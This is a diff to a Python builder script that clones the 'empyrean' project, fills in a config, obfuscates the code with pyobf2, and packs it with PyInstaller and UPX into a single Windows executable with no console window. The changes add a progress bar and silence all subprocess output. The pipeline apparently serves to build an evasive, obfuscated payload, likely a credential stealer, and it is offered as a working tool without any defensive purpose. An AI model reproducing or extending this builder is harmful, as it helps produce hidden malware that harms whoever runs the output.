@@ -1,9 +1,18 @@
-import zipfile
 import os
+import re
 import shutil
 import subprocess
-import re
+import zipfile
+
 import requests
+from rich.progress import (
+    BarColumn,
+    Progress,
+    SpinnerColumn,
+    TextColumn,
+    TimeElapsedColumn,
+)
+
 from InquirerPy import prompt  # type: ignore
 
 
@@ -68,7 +77,7 @@ class Config:
 
 class MakeEnv:
     """
-    The MakeEnv class creates the build directory and clones the source code 
+    The MakeEnv class creates the build directory and clones the source code
     """
 
     def __init__(self) -> None:
@@ -88,7 +97,7 @@ class MakeEnv:
         Clones the source code from a specified repository into the build directory
         """
         subprocess.run(
-            ['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir)
+            ['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         shutil.move(os.path.join(self.build_dir,
                     'empyrean', 'src'), self.build_dir)
 
@@ -127,9 +136,9 @@ class DoObfuscate:
         Clones the obfuscator from a specified repository into the build directory
         """
         subprocess.run(
-            ['git', 'clone', 'https://github.com/0x3C50/pyobf2.git'], cwd=self.build_dir)
+            ['git', 'clone', 'https://github.com/0x3C50/pyobf2.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(
-            ['git', 'checkout', '4173bd1d47c360e1a66ac72c627b7efc478a16c8'], cwd=os.path.join(self.build_dir, 'pyobf2'))
+            ['git', 'checkout', '4173bd1d47c360e1a66ac72c627b7efc478a16c8'], cwd=os.path.join(self.build_dir, 'pyobf2'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     def write_config(self) -> None:
         """
@@ -143,14 +152,14 @@ class DoObfuscate:
         Executes the obfuscator
         """
         subprocess.run(
-            ['pip', 'install', '-r', 'requirements.txt'], cwd=os.path.join(self.build_dir, 'pyobf2'))
+            ['pip', 'install', '-r', 'requirements.txt'], cwd=os.path.join(self.build_dir, 'pyobf2'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(
-            ['python', 'main.py'], cwd=os.path.join(self.build_dir, 'pyobf2'))
+            ['python', 'main.py'], cwd=os.path.join(self.build_dir, 'pyobf2'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 class Build:
     """
-    The Build class downloads and installs the necessary packages and 
+    The Build class downloads and installs the necessary packages and
     then builds the source code
     """
 
@@ -187,29 +196,61 @@ class Build:
         Builds the source code using pyinstaller and UPX
         """
         subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(
-            self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'src', 'main.py')])
+            self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'src', 'main.py')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 def main() -> None:
+    progress = Progress(
+        TextColumn("[bold blue]{task.description}", justify="right"),
+        BarColumn(bar_width=None),
+        SpinnerColumn(
+            finished_text="✅",
+            speed=0.1,
+            spinner_name="dots",
+            style="green",
+        ),
+        TimeElapsedColumn()
+    )
+
     config = Config()
     config_data = config.get_config()
 
-    make_env = MakeEnv()
-    make_env.make_env()
-    make_env.get_src()
+    with progress:
+        task1 = progress.add_task("[bold green]Making environment...", total=3)
+        make_env = MakeEnv()
+        progress.update(task1, advance=1)
+        make_env.make_env()
+        progress.update(task1, advance=1)
+        make_env.get_src()
+        progress.update(task1, advance=1)
 
-    write_config = WriteConfig(config_data)
-    write_config.write_config()
+        task2 = progress.add_task("[bold green]Writing config...", total=2)
+        write_config = WriteConfig(config_data)
+        progress.update(task2, advance=1)
+        write_config.write_config()
+        progress.update(task2, advance=1)
 
-    do_obfuscate = DoObfuscate()
-    do_obfuscate.get_obfuscator()
-    do_obfuscate.write_config()
-    do_obfuscate.execute_obfuscator()
+        task3 = progress.add_task("[bold green]Obfuscating...", total=4)
+        do_obfuscate = DoObfuscate()
+        progress.update(task3, advance=1)
+        do_obfuscate.get_obfuscator()
+        progress.update(task3, advance=1)
+        do_obfuscate.write_config()
+        progress.update(task3, advance=1)
+        do_obfuscate.execute_obfuscator()
+        progress.update(task3, advance=1)
 
-    build = Build()
-    build.get_pyinstaller()
-    build.get_upx()
-    build.build()
+        task4 = progress.add_task("[bold green]Building...", total=4)
+        build = Build()
+        progress.update(task4, advance=1)
+        build.get_pyinstaller()
+        progress.update(task4, advance=1)
+        build.get_upx()
+        progress.update(task4, advance=1)
+        build.build()
+        progress.update(task4, advance=1)
+
+    print('Done!')
 
 
 if __name__ == '__main__':
